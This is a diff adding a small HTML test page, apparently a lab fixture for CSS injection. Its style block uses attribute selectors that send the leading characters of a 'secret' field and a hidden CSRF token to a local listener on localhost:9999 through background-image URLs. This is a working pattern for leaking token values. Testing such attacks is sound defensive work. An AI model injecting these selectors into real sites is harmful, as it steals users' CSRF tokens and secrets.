@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Test Css injections</title>
+</head>
+<style>
+  input[name="secret"][value^="a"] {
+  background: url(http://localhost:9999?q=a)
+}
+
+input[name="secret"][value^="b"] {
+  background: url(http://localhost:9999?q=b)
+}
+
+input[name="secret"][value^="c"] {
+  background: url(http://localhost:9999?q=c)
+}
+
+input[name="secret"][value^="z"] {
+  background: url(http://localhost:9999?q=z)
+}
+
+input[name="csrf-token"][value^="a"] + input {
+  background: url(http://localhost:9999?q=a)
+}
+
+</style>
+<body>
+  <!-- <input name="secret" value="abc123"> -->
+  <form action="/action">
+    <input type="hidden" name="csrf-token" value="abc123">
+    <input name="username">
+    <input type="submit">
+  </form>
+  
+</body>
+</html>
